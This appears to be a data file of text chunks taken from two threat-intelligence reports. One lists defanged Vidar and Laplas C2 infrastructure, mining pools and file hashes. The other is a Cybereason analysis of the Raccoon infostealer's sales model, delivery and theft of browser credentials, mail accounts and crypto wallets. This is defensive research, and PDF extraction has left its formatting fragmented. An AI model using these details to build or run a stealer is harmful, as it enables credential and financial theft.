

Categorised as malicious by nine threat intelligence vendors within the VirusTotal platform Classified with a spam-based reputation and malware, within the Cisco Talos Intelligence platform



49[.]12[.]113[. ]110

Geolocation:

Essen, North Rhine



Westphalia, Germany

ASN:

Hetzner Online GmbH

Historical DNS:

Thr eat Intelligence Profile:









static[.]110[.]113[.]12[.]49[.]clients[. ]your



server[. ]de: 2022



03



25



2023



01



24

ashe[.]faqit[. ]net: 2022



07



23



2022



10



10

intralean



warstein[. ]de: 2020



12



29



2022



04



29

www[. ]intralean



warstein[. ]de: 2020



12



29



2021



12



12"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|946a496f6b994046926b8af445e64ede
"10

intralean



warstein[. ]de: 2020



12



29



2022



04



29

www[. ]intralean



warstein[. ]de: 2020



12



29



2021



12



12



Categorised as malicious by nine threat intelligence vendors within the VirusTotal platform IP addresses are related to “Valorent.exe”, which is linked to Riot Games downloads recently breached by a ransomware strain Related to the “ArkeiStealer” signature within the MALWARE bazaar platform





TLP Status: White

Privileged & Confidential

Page 34 of 39

5[.]75[.]173[. ]242

Geolocation:

Gunzenhausen, Bavaria, Germany

ASN:

Hetzner Online GmbH

Historical DNS:

O pen ports:

Thr eat Intelligence Profile:





51[.]rdbro[. ]online



2022



11



26



2022



11



26

static[.]242[.]173[.]75[.]5[.]clients[. ]your



server[. ]de



2021



08



04



2023



01



23

Port 22: SSH



2.0



OpenSSH_8.9p1 Ubuntu



3





Categorised as malicious by nine threat intelligence vendors within the VirusTotal platform IP address range related to activity in the region of Iran 17

89[.]208[.]104[. ]172

Geolocation:

Amsterdam, North Holland, Netherlands

A SN :

AEZA GROUP Ltd

Hi s torical DNS:





llh3u1am3tezkhrc3m5mukzac2zq9999[.]wbnkeaf2d6lwee55uthcphq9[.]cbox4[. ]ignorelis

t[. ]com



2022



09



19



2022



09



19

nsmwxgbvqpda2yq2eawaczvhe5ta9999[.]sjufiwxvi5qzp4ip535naaq9[.]cbox4[. ]ignorelist[

. ]com



2022



08



10



2022



08



10

Open ports:





22, 80, 6379

309 filtered ports"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|aff5fa9f854d4a9f82fe1e29860805d1
". ]com



2022



08



10



2022



08



10

Open ports:





22, 80, 6379

309 filtered ports

Threat Intelligence Profile:











Associated with a malicious reputation within the Cisco Talos Intelligence platform Categorised as malicious by 14 threat intelligence vendors within the VirusTotal platform Related to the “ArkeiStealer” signature within the MALWARE bazaar platform Open source: Loader is reported to drop another stealer (bebra.exe & clip1.exe) 18 IP address is blocked by the sites due to it being registered as spam or malicious in nature: o Spamhaus[. ]org o Abuseat[. ]org o Spamrats[. ]com o Surbl[. ]org o Uceprotect[. ]net

17 https://en.ntunhs.net/IPInfo/EN/5/75.htm

18 https://twitter.com/AnFam17/status/1609762874913689600

TLP Status: White

Privileged & Confidential

Page 35 of 39

77[.]73[.]134[. ]24

Geolocation:

Vienna, Austria

A SN :



Partner LLC

Hi s torical DNS:



ninc[.]optimumwiz[. ]com



2019



09



02



2020



04



04



midpc[.]rushpicks[. ]com



2019



08



03



2019



08



03



msgin[.]westporotels[. ]com



2018



04



08



2018



12



03

Open ports:



22, 80

Threat Intelligence Profile:"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|f523e471e00a409eb041df127fbb2b01
"08



03



msgin[.]westporotels[. ]com



2018



04



08



2018



12



03

Open ports:



22, 80

Threat Intelligence Profile:











Open source: Loader is reported to drop another stealer (bebra.exe & clip1.exe) 19 Reported as C2 server for Redline Stealer Recorded Future Risk Score: 99-99 (Very Malicious) Categorised as malicious by 17 threat intelligence vendors within the VirusTotal platform Tagged with Raccoon Stealer malware within the URL haus database 20 and the N-W0rm malware within the MALWARE bazaar database 21 Linked with E-banking trojan and spyware22 IP address is blocked by the sites due to it being registered as spam or malicious in nature: o Spamhaus[. ]org o Abuseat[. ]org o Surbl[. ]org





116[.]202[.]7[. ]135

Geolocation:

Ber lin, Germany

A SN :



Hetzner Online GmbH

Hi s torical DNS:











static[.]135[.]7[.]202[.]116[.]clients[. ]your



server[. ]de



2019



05



14



2023



01



31

pr[. ]download



film[. ]site



2023



01



27



2023



01



27

efusgw[.]thecoffeeclub[. ]live



2019



10



04



2020



09



03

internet



stream



movies[. ]com



2011



04



17



2011



04



17

boldtop[. ]info



2011



04



17



2011



04



17

Threat Intelligence Profile:





Categorised as malicious by 11 threat intelligence vendors within the VirusTotal platform IP addresses are related to “Valorent.exe”, which is linked to Riot Games downloads recently breached by a ransomware strain"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|ef818adb900347c8b9132201ea5dafab
"19 https://twitter.com/AnFam17/status/1609762874913689600

20 https://urlhaus.abuse.ch/browse/tag/RaccoonStealer/

21 https://bazaar.abuse.ch/sample/4edb9ceda2b49b682d3e30c4925610f81ffcc7d2b46a2d59d5930d6a1d69fbc7/

22 https://www.joesandbox.com/analysis/1158774

TLP Status: White

Privileged & Confidential

Page 36 of 39

49[.]12[.]8[. ]228

Geolocation:

Gunzenhausen, Bavaria, Germany

A SN :

Hetzner Online GmbH

Hi s torical DNS:

















static[.]228[.]8[.]12[.]49[.]clients[. ]your



server[. ]de



2020



07



02



2023



01



31

a[.]alphaq[. ]tk



2023



01



26



2023



01



26

pkg[.]imranfnet[. ]xyz



2023



01



19



2023



01



22

mx2[.]ploit[. ]de



2020



10



20



2022



08



02

mail[.]ploit[. ]de



2020



11



02



2022



07



24

matrix[.]nurmalso[. ]tk



2020



09



20



2020



10



17

nurmalso[. ]tk



2020



10



02



2020



10



04

netdata[.]nurmalso[. ]tk



2020



10



04



2020



10



04

Open ports:



Port 80: HTTP/1.1 200 OK Server: Caddy Date: Thu, 26 Jan 2023 23:43:21 GMT ContentLength: 0

Threat Intelligence Profile:







Reported as a Vidar c223 Categorised as malicious by 11 threat intelligence vendors within the VirusTotal platform Classified with a spam-based reputation and malware, within the Cisco Talos Intelligence platform

23 https://asec.ahnlab.com/en/45359/

TLP Status: White

Privileged & Confidential

Page 37 of 39

Detection

Indicators of Compromise

Type

Description"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|03f9b40f86ef4603976c834d7365e10a
"TLP Status: White

Privileged & Confidential

Page 37 of 39

Detection

Indicators of Compromise

Type

Description

Values

U RL

Intermediary C2

hxxps[://]steamcommunity[. ]com/profiles/76561199467421923

hxxps[://]steamcommunity[. ]com/profiles/76561199469677637

hxxps[://]steamcommunity[. ]com/profiles/76561199471266194

hxxps[://]steamcommunity[. ]com/profiles/76561199472399815

U RL

Intermediary C2

hxxps[://]t[. ]me/year2023start

hxxps[://]t[. ]me/tgdatapacks

hxxps[://]t[. ]me/jetbim

hxxps[://]t[. ]me/jetbim2

hxxps[://]t[. ]me/litlebey

Dom ain

Laplas Clipper C2 domain

clipper[. ]guru

Dom ain

Laplas Clipper C2 domain

laplas[. ]app

IP A ddress

Vidar C2s

5[.]75[.]173[. ]242

5[.]75[.]182[. ]6

49[.]12[.]8[. ]228

49[.]12[.]113[. ]110

65[.]109[.]200[. ]241

65[.]109[.]208[. ]140

65[.]109[.]208[. ]142

65[.]109[.]210[. ]114

78[.]47[.]172[. ]233

78[.]47[.]228[. ]65

88[.]198[.]120[. ]151

91[.]107[.]156[. ]138

94[.]130[.]190[. ]48

95[.]217[.]16[. ]127

116[.]202[.]0[. ]132

116[.]202[.]7[. ]135

116[.]203[.]9[. ]69

195[.]201[.]237[. ]253

195[.]201[.]251[. ]109

IP A ddress

Malicious executable dropper

TLP Status: White

89.208.104[. ]172

Privileged & Confidential

Page 38 of 39

IP A ddress

Malicious executable dropper

77.73.134[. ]24

IP A ddress

Crypto mining pool

xmr



eu1.nanopool.org

135[.]125[.]238[. ]108

51[.]15[.]58[. ]224

51[.]68[.]190[. ]80

51[.]15[.]65[. ]182

51[.]15[.]78[. ]68

51[.]15[.]69[. ]136

51[.]68[.]143[. ]81"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|ac263714cf6b47fc9531eefcd91a023e
"135[.]125[.]238[. ]108

51[.]15[.]58[. ]224

51[.]68[.]190[. ]80

51[.]15[.]65[. ]182

51[.]15[.]78[. ]68

51[.]15[.]69[. ]136

51[.]68[.]143[. ]81

51[.]15[.]54[. ]102

51[.]255[.]34[. ]118

Dom ain

XMR crypto mining pools

xmr



eu1.nanopool.org

xmr



eu2.nanopool.org

xmr



us



east1.nanopool.org

xmr



us



west1.nanopool.org

xmr



asia1.nanopool.org

xmr



jp1.nanopool.org

xmr



au1.nanopool.org

F i le Hash

Initial file which contains the malware

FullMainFile_Use_2023_As_PassWrd.rar

SHA



265: e433512ad2b47afbc778ab161a218944b504c90f513ff320d2aa8bfc55d5cb25

F i le Hash

Initial malware executable

Setup.exe (iHciaG.exe)

SHA



265: 6afd1ceacb145d84e706c553247459bbd492733e50f21de8a42424ba7de87c62

F i le Hash

Laplas Clipper

Clip1.exe

SHA



256: 8e6e3db76d44df50f82628eaaaf96fd9ef4dad484bc954ad0388fc6b6a66da43

F i le Hash

XMRIG

Mina.exe

SHA



256: a0434fdcaec62f8af073f34c580a94cb58d21203f5edf2ccbbcc467b53570d87

F i le Hash

Malicious executable which

downloads mina.exe and

clip1.exe

45273182709226343864.exe (WindowsFormsApp3.exe)

SHA



256: 16cae9d579719cda69f0453f8542470768769feb7c72ba0619dac159f821072b

F i le Hash

Bebra, a previously unknown

stealer

Bebra.exe (MySQLInstallerUpdater.exe)

SHA



256: c9487cb734eaca9afb87d6f71614bdfca5f3f5e70568971391d53e369badf149

TLP Status: White

Privileged & Confidential

Page 39 of 39"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|a62e472df722404588c10d3b2616d3eb
"Hunting Raccoon: The New Masked Bandit on the Block cybereason.com/blog/hunting-raccoon-stealer-the-new-masked-bandit-on-the-block

Written By Cybereason Nocturnus October 24, 2019 | 14 minute read Research by: Assaf Dahan & Lior Rochberger

Introduction Since April 2019, the Cybereason Nocturnus team has investigated multiple infections of the Raccoon stealer in the wild across organizations and individuals. In this research, we focus on two key aspects: A Glimpse Into the Underground: A survey of Raccoon’s origin, team members, business model, and marketing efforts, as well as Raccoon’s reception by the underground cybercrime community and the existing feuds between Raccoon’s team and their direct competitors. A Technical Breakdown: A comprehensive technical overview of Raccoon’s current capabilities and delivery methods, with a look into their future plans for the malware.

1/17"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|80c29251db8047aba67ae41a11dec7ee
"1/17

The top 10 malware mentions over seven months in 2019 from Recorded Future. The Raccoon stealer is one of the 2019 top 10 most-mentioned malware in the underground economy and is widely known to have infected hundreds of thousands of devices around the world, despite it not being overly sophisticated or innovative. This strain of malware first emerged as recently as 2019, and has already established a strong following among cybercriminals. Its popularity, even with a limited feature set, signals the continuation of a growing trend of the commoditization of malware as they follow a MaaS (Malware-as-a-Service) model and evolve their efforts. Build an iterative defense that addresses threats like these. Read our white paper on how to use MITRE ATT&CK to create a closed-loop security process."|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|7114e746b6864306b7ae5495b4cc7bd0
"Key Points The Raccoon Infostealer: The Cybereason Nocturnus team has been investigating multiple incidents involving the Raccoon infostealer since April 2019, and is now able to give a thorough analysis of the technical aspects of the malware alongside a look into the likely Russian team behind it. Steals a Wide Range of Data: Raccoon lacks sophistication, but leverages several potential delivery methods and is able to steal a large swath of important data, including credit card information, cryptocurrency wallets, browser data, and email credentials. Is Quickly Gaining Traction: Despite being released earlier this year, the Raccoon stealer is exploding in popularity in the underground community to become one of the top 10 most-referenced malware on the market in 2019, infecting hundreds of thousands of endpoints globally across organizations and individuals in North America, Europe, and Asia. Enables Any Individual to Easily Commit Cybercrime: Raccoon follows a malware-as-a-service model, allowing individuals a quick-and-easy way to make money stealing sensitive data without a huge personal investment or technical know-how. Has a Strong Following Underground: The team behind Raccoon is lauded in the underground community for their level of service, support, and user experience, but has faced several bouts of public feuds and internal disputes.

2/17"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|9e492b18a2c14ab29c2173220b37edca
"2/17

TABLE OF CONTENTS Raccoon, also known as “Mohazo” or “Racealer”, is at its core a simple information stealer often seen delivered by the Fallout and RIG Exploit Kits. It is used to steal data like credit card information, cryptocurrency wallets, browser-related data, and mail clients. Although it is not an advanced malware, it is estimated to have infected hundreds of thousands of devices around the world and is in the top 10 mentioned in the underground communities for 2019. Raccoon is written in C++ and works on both 32-bit and 64-bit operating systems. Though it was originally classified as a password stealer by many AV companies, we and others in the community see it leverage broader capabilities and categorize it as an information stealer. Raccoon searches system files for a range of confidential data which it saves and sends to its operator. It is able to collect the following data: Credit Card Data Cryptocurrency Wallets Passwords Emails Data from All Popular Browsers Including Credit Card Info, URLs, Usernames, Passwords Cookies System Information

Threat Actor Overview The Raccoon stealer is developed by a team that appears to originate in Russia and be Russian-speaking. The team initially promoted the stealer in exclusively Russian-speaking hacking forums, but now actively promotes it in Englishspeeaking communities as well. It is aggressively marketed in the cybercrime underground and has been since April 2019."|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|416a3102b7b3447f8b28361cc9df8d2a
"Raccoon stealer marketed in a Russian underground forum. Raccoon is sold as a MaaS with features like an easy-to-use automated backend panel, bulletproof hosting, and 24/7 customer support in both Russian and English. As of this writing, it costs $200 per month to use.

3/17

How to contact the Raccoon Team.

Much like any other software-as-a-service, the Raccoon stealer appears to be in active development. The development team seems to be quick, responsive, and dedicated, using short development cycles to release updates, bug fixes, and new features within days. They are also highly active in underground communities under the username raccoonstealer. They post daily and reply to community questions and comments within hours in underground forums and on Telegram."|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|ee9ad82226f3422eb3ca1847d1c23dce
"Who is behind the Raccoon Stealer? While the identity of the team behind Raccoon remains unknown, some members in the underground community attribute the project to another well-known member, glad0ff. Alexuiop1337, the author of predator stealer and one of the strongest critics of Raccoon, was one of the first to make this allegation. Of course, the accusations made by direct competitors should be taken with a grain of salt. However, the leads Alexuiop1337 provided in his blog can potentially tie glad0ff to Raccoon. An analysis of the Raccoon stealer’s hacked panel and leaked customer base could imply the admin of Raccoon is a user with the online handle glad0ff. The user glad0ff was created in the Raccoon stealers database in February of 2019, roughly two months before the team began aggressively marketing Raccoon to the underground community.

glad0ff user creation date in Raccoon’s database.

One of the first mentions of Raccoon in underground forums.

Who is glad0ff?

4/17"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|eb622d47684c4b5793149b6bf2cc0587
"glad0ff user creation date in Raccoon’s database.

One of the first mentions of Raccoon in underground forums.

Who is glad0ff?

4/17

glad0ff is a long-time threat actor responsible for developing malware like the Decrux and Acrux cryptominers, the Mimosa RAT and the ProtonBot loader. glad0ff caters to less sophisticated cyber criminals looking for easy-to-use, endto-end solutions. Similar to customers of Raccoon, customers from many of glad0ff’s previous projects praise the quality of service, dedication, and responsiveness when fixing issues. It was previously believed that glad0ff operated alone, however, there are indications that the Raccoon stealer involved other members, as we discuss later on. It’s also interesting to note that glad0ff stopped posting in many underground forums in April of 2019, which aligns with the launch of the Raccoon stealer.

Last seen date for the glad0ff user.

Is Raccoon Tied to Malware from Other Threat Actors? Other members in the underground community have questioned whether Raccoon is linked to other stealers like Vidar and Baldr, as they noticed great similarities between the aforementioned infostealers. Raccoon team members consistently deny any ties to other stealers.

“Do you have any relation to the Vidar team?” Reply: “No.”"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|f51f80f3ecd74d63ac14e4c46769b5c1
"“Do you have any relation to the Vidar team?” Reply: “No.”

Raccoon’s Reception in the Underground Community It is interesting to note that many individuals choose to write reviews for Raccoon. As malware authors turn to MaaS, they follow many of the same paths as a legitimate SaaS business: marketing efforts, relying on positive reviews, responsive customer support, and regularly improving features in their product.

Positive Feedbacks and Endorsements Generally, feedback around Raccoon in the underground community is positive. Many in the community praise and endorse Raccoon’s malware capabilities and the services the team provides. Some voices in the community even endorse it as a worthy replacement for the famous Azorult stealer. However, it is important to note that there are some dissenting opinions. Advanced members in the community find Raccoon to be simple and lacking in features when compared to other information stealers. With that said, many in the community believe that while the malware may lack in features, sophistication, or innovation, it largely makes up for it with consistency and an impressive level of service, support, and quality user experience.

5/17"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|5a8b222cf5294d2ca13091f26e741068
"5/17

Raccoon’s popularity combined with its limited feature set yet high adoption speaks to a growing trend of the commoditization of malware, as malware authors shoot to create platforms for crime instead of committing the crimes directly. Example #1: Early Adopter Replaces Azorult This early adopter of Raccoon claims he has been using it since the initial launch. After Azorult was shut down at the end of 2018, he tried almost every stealer on the market before settling on Raccoon.

“I am among the first clients of these guys, practically using their product since the initial launch. I have used many other stealers before, essentially i tried all there is in this market to offer. After the “death” of “azora” (Azorult malware), I searched for a long time for a decent replacement and finally, found it in Racoon! Example #2: Praise for Excellent Service This user leveraged a free trial of Raccoon, and deemed it an excellent product they were interested in switching to. They specifically reference one instance where there was a bug in the panel’s search engine that was fixed immediately on the fly."|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|f8d6db171e074bb3b655cdba605b3ba7
"“They let me try the stealer for a few days. In general, first impressions were good. The rate of successful infection is very good. Had an issue with the control panel’s search engine. Problem was solved immediately, on the fly ) There is no support for IE, and the download of all logs, but i have been told that these features will be added in the near future. Not bad at all. Thinking of getting it as soon as my current lease is over)” Example #3: User Testimonial - A Worthy Replacement for Azorult This user switched from Azorult to Raccoon because of how easy the control panel was to use. In addition, the user experiences a very high success rate and is a big supporter of the quality of service.

6/17

“I switched from azor (Azorult) to raccoon and got a great joy of how convenient the admin control panel is, there are no extra, unnecessary details such as in vidar (Vidar malware) but there are these small, little details that are helpful and mandatory for people who process a large amount of logs. If judging the build, that everything is alright, with azor i always had around 60%+ of successful infection rate and here i found a good crypter and have 90% of rate… [snipped] What surprised me is the support that treats you as a VIP class client, they will do whatever you demand and with expressing gratitude, etc. it is very nice and I have never seen experienced it anywhere else.”"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|79129e50939d40ef8e1309a0fc1a4864
Criticism of Raccoon by Members of the Underground Community Since day one, some members of the underground community have criticized Raccoon, specifically targeting it's lack of capabilities, poor coding, and several security issues in the infrastructure and admin panel code. Perhaps one of the most negative reviews comes from Alexuiop1337. Alexuiop1337 wrote a very detailed blog dissecting and criticizing the malware and its infrastructure. According to Alexuiop1337, Raccoon has vulnerabilities that let attackers DDoS their servers and dump sensitive data. In his review, Alexuiop1337 also tries to expose the identity of one of the developers behind Raccoon by claiming it is glad0ff/wankfbi, another member of the underground community Other negative reviews voiced by customers or testers complain that Raccoon has: 1. A low success rate for infection at about 45%. 2. Some bugs that make it difficult to access logs and delete logs from the control panel. 3. Some missing information or version compatibility issues in its stealing modules.|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|3897d3a4cb594328bba501ffc0968b85
"“- The stealer often doesn’t still software or its version, and for me it was important The cookies from the stealer are often transferred incomplete, I don't understand why it does it, but in the previous stealer there were no such problems ” Public Disputes and Controversies with the Raccoon Team Within the underground community, the Raccoon team is also facing some public disputes and controversies. These disputes offer an important glimpse into the inner workings of the team and give a broader sense of just how competitive the commodity malware market is. In addition, these conflicts validate our hypothesis that Raccoon is not operated by a single user, but by a team. It gives insight into the types of relationships the team members have and how fragile and opportunistic those ties can be. Internal Disputes Shed Light on the Raccoon Team Dynamics

7/17

The first public signs of tension between Raccoon team members began shortly after their launch in April. Following a leak of their customer database, the team released a statement claiming their servers were not hacked, but that the leak was caused by a disgruntled team member using the database as blackmail for more money. When the team member demands were not met, they released the database to embarrass the Raccoon team. Though the team explicitly states the blackmailer was not working directly with their competitors, they did accuse Alexuiop1337 and overdot of hyping the situation in order to capitalize on it."|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|100b8c1f4b9b41e68677cef0e3824820
"“The aforementioned user had access to the intra-team test API (dock), had all the links, had a password from the admin account, which allowed us to document the list of users and register accounts for their unfortunate pentesters. Yes, our mistake was that after the reorganization of the team, we did not react quickly enough, no one expected such meanness.” “This person will do what it takes, for personal revenge against the project. On the launch day, he demanded money from us, threatened us, but even after that we couldn’t believe that he was capable of such baseness.” “We do not claim that @Alexuiop1337 and @overdot work directly with this person, but an attempt to hype this situation on behalf (of the aforementioned person)” Additionally, in June of 2019 raccoonstealer published an unusual post that revealed an internal feud with former team members. Allegedly, Participant 777 (777@raccoon.biz) stole $900 from the community balance and left the project.

""Attention! We do not offer any services except the rental of our software! Participant 777 left the project, taking $900 from the shared common fund. There was scam attempt from the telegram account @enot_support. In the “expe” (a Russian slang for the infamous “exploit[. ]in” underground hacking community), they blacklisted the aforementioned account. THE ONLY CONTACTS FOR CONTACTING US! Jabber: support@raccoon.biz randomuser@ucia.icu green@raccoon.biz Telegram: @ darkgr33n“

8/17"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|644c8517ce864d2d81c8f5173280dfae
"8/17

These two incidents make it clear that Raccoon is developed by several individuals that work together, but are not necessarily a tight-knit team.

Raccoon Stealer Overview How is Raccoon Delivered? Raccoon is delivered in multiple ways, though we see Raccoon delivered most often through exploit kits, phishing attacks, and through bundled malware. Delivery by Exploit Kit Exploit kits automatically exploit vulnerabilities on a victim’s machine while they are browsing the web. In browsing the web, the user visits a malicious page that redirects to a landing page containing exploit code, often executed without the users consent or interaction. In order to deliver Raccoon, the attackers leverage the Fallout exploit kit to spawn a PowerShell instance from Internet Explorer and subsequently download the main payload of the infostealer.

The Fallout exploit kit delivers Raccoon, as seen in the Cybereason platform. Delivery by Phishing Phishing is a social engineering attack where a user is tricked into executing malicious content. Most commonly, the user receives an email with an attached Office document. This document contains embedded malicious macro code that, when opened, executes. In order to deliver Raccoon, the attackers use an email with an attached Word document. Upon opening the Word document and enabling macros, the macro code creates a connection to a malicious domain and downloads the main payload of the infostealer.

9/17"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|7b55fb848aa0476da8092d9f47382ee7
"9/17

The malicious Word document downloading the Raccoon stealer payload, as seen in the Cybereason platform. Delivery by Bundled Malware Bundled malware is malware that is bundled with legitimate software downloaded from “shady” websites. The bundled malware is often hidden from the user during installation or makes use of social engineering techniques to enable installation. In order to deliver Raccoon, the attackers use legitimate software bundled with the main payload of the infostealer to infect unsuspecting users. Raccoon installs itself behind-the-scenes, hidden from the user.

Exploring Raccoon’s Code and Core Functionality

The internal path from malware compilation on the attackers machine. As mentioned above, the Raccoon team appears to be of Russian origin. A typo found in the internal path also suggests they are not native English speakers.

The Raccoon team issuing a recommendation for a third-party crypter. The main payload of Raccoon is not packed and does not include built-in anti-debug or anti-VM protections. It is sold as-is without any protection from analysts or detection. However, the Raccoon team does recommend a third-party crypter call GreenCrypt to evade antivirus products and protect against detection and analysis.

10/17"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|cdcf751756114ae2b3d3a710f71d3f85
"10/17

Raccoon’s Communication with its C2 Server Once the loader executes on the target machine, it unpacks itself in memory and connects to its C2 server. Raccoon sends a POST request with Base64-encoded parameters bot_id and config_id.

Raccoon sending a POST request with two parameters. Upon successful connection and verification of Raccoon’s Bot ID, it downloads a compressed zip file with multiple different DLLs. These DLLs are not necessarily malicious on their own, but Raccoon depends on them to successfully collect and steal data on the target machine. Gathering Local Settings on the Target Machine

The Raccoon stealer code checks the target machine’s local settings. However, the Raccoon stealer does check the target machine’s local settings and compare it against a list of languages, including Russian, Ukrainian, Belarussian, Kazakh, Kyrgyz, Armenian, Tajik, and Uzbek. If the target machine’s local settings match one of these languages, the malware immediately aborts. This is common practice by malware originating from CIS countries. Collecting Sensitive Data After initial infection, the Raccoon stealer uses several methods to collect sensitive information. It stores any sensitive information it finds in the Temp folder. Capturing Screenshots from Infected Machine

The Raccoon stealer code takes a screen capture of the target machine. 11/17"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|ae113b2fce1d450cbf92f62ce2215622
"The Raccoon stealer code takes a screen capture of the target machine. 11/17

Raccoon takes a screen capture of the target machine using GetDesktopWindow and CreateCompatibleBitmap, and stores it as screen.jpeg in the Temp folder. Stealing System Information Raccoon collects system information from the infected machine, including username, IP address, language settings, OS version, information on installed apps, and CPU and memory information. The information is stored in a text file found in: C:\Users\[user]\AppData\Local\Temp\machineinfo.txt

Information collected by the Raccoon Stealer. Stealing Browser Information A lot of saved browser data is stored within SQLite database files on a local machine. For example, when a user saves their username and password in the browser, the browser stores the data in a Login Data SQLite database file. The browser also stores cookie information in a cookies file, and other autofill data, like credit card data, in a Web Data file. Raccoon steals this information from over thirty different browser types. It searches the registry software hive for installed browsers and steals credentials, cookies, and autofill data from targeted browsers. Browsers Targeted by the Raccoon Stealer

Chrome

Amigo

RockMelt

Sputnik

Chromium

Orbitum

360Browser

Kometa

Xpom

Bromium

Vivaldi

uCozMedia

Comodo

Nichrome

Opera

QIP Surf

Epic Privacy Browser

CocCoc

Suhba

Chedot

CentBrowser

Elements Browser

Safer Technologies



Secure Browser"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|861c2a7c69654d3c8e88d92374e8a543
"Comodo

Nichrome

Opera

QIP Surf

Epic Privacy Browser

CocCoc

Suhba

Chedot

CentBrowser

Elements Browser

Safer Technologies



Secure Browser

Superbird

7Star

TorBro

Rafotech



Mustang

Torch

12/17

Firefox

WaterFox

SeaMonkey

Pale Moon

GO!

Example of Raccoon’s browser stealing configuration code Raccoon copies targeted browser data files to the Temp folder with random names. It uses a DLL, SQLite3.dll, downloaded from its C2 server to parse the files and extract sensitive data. The stolen information is divided into several text files named after their associated browser and saved under Temp/browsers. Raccoon also creates one master file with the name passwords.txt that contains any and all passwords stolen from the victim’s machine.

Example of the format of passwords.txt, containing passwords stolen by Raccoon. Stealing Outlook Accounts

Raccoon’s code to extract information about Microsoft Outlook accounts. Raccoon extracts information about Microsoft Outlook accounts from registry keys on the target machine. HKEY_CURRENT_USER\Software\Microsoft\Office\Outlook\OMI Account Manager\Accounts HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings

13/17"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|852040480c5848e98a231134973d82f3
"13/17

HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook In addition, Raccoon searches the Windows Registry for sensitive information stored in Mail clients, such as usernames and passwords, then saves it to a text file under Temp/mails.

Raccoon gathering information from Mail client accounts on the target machine. Stealing Cryptocurrency Wallets Raccoon searches for multiple cryptocurrency wallets on the machine, including: C:\Users\<user>\AppData\Roaming\Electrum\wallets C:\Users\<user>\AppData\Roaming\Jaxx\Local Storage C:\Users\<user>\AppData\Roaming\Exodus\exodus.wallet C:\Users\<user>\AppData\Roaming\Ethereum Wallet If any cryptocurrency wallets are found, they are saved under Temp. For the convenience of the client, Raccoon has a service that automatically processes all cryptocurrency wallets without needing to search for specific logs among all the stolen data. New features to come? Current versions of Raccoon do not have keylogging functionality. Several users in the underground community are asking for this feature, and the Raccoon team has suggested it may be available in the future.

Screenshot from the underground community of the Raccoon team considering adding support for keylogging.

Data Exfiltration & Self Deletion Raccoon saves all stolen data to a zip file gate.zip and sends the information to its C2 server.

14/17"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|3309ee15981b4e08be4c955111427486
"Data Exfiltration & Self Deletion Raccoon saves all stolen data to a zip file gate.zip and sends the information to its C2 server.

14/17

All stolen data Raccoon has collected on the target machine. After it successfully exfiltrates all sensitive data, Raccoon deletes its binary from the victim’s machine, as can be seen in the following screenshot of Raccoon’s process spawning cmd.exe with ping.exe and executing the deletion command.

The malicious process Raccoon creates to delete any trace on the machine.

How is Raccoon Affecting Businesses and Individuals? Based on the logs for sale in the underground community, Raccoon is estimated to have infected over 100,000 endpoints worldwide within a few months. It is easy to operate for technical and nontechnical individuals alike, lending it mass appeal. Moreover, the team behind Raccoon is constantly working to improve it and provide responsive service. It gives individuals a quick-and-easy way to make money stealing sensitive data without investing a lot of funds or having a deep technical background. Raccoon collects a wide swath of information, including credit card information, cryptocurrency wallets, usernames and passwords, and browsing data, which is used to steal corporate data, money, and other sensitive information. This data is used against victims as blackmail or monetized by cybercriminals selling it in underground communities."|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|7e054b4cc40545be954c47f87b635c68
"Cybereason Vs. Raccoon? In addition to our anomalous behavior detection and investigation capabilities, Cybereason’s NGAV technology can detect and prevent Raccoon infections.

Screenshot from VirusTotal, Cybereason NGAV detects Raccoon’s executable as malicious.

15/17

Cybereason platform prevents the malicious executable."|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|0f2acf4a7ec146c7beb8dfea9d5c89ba
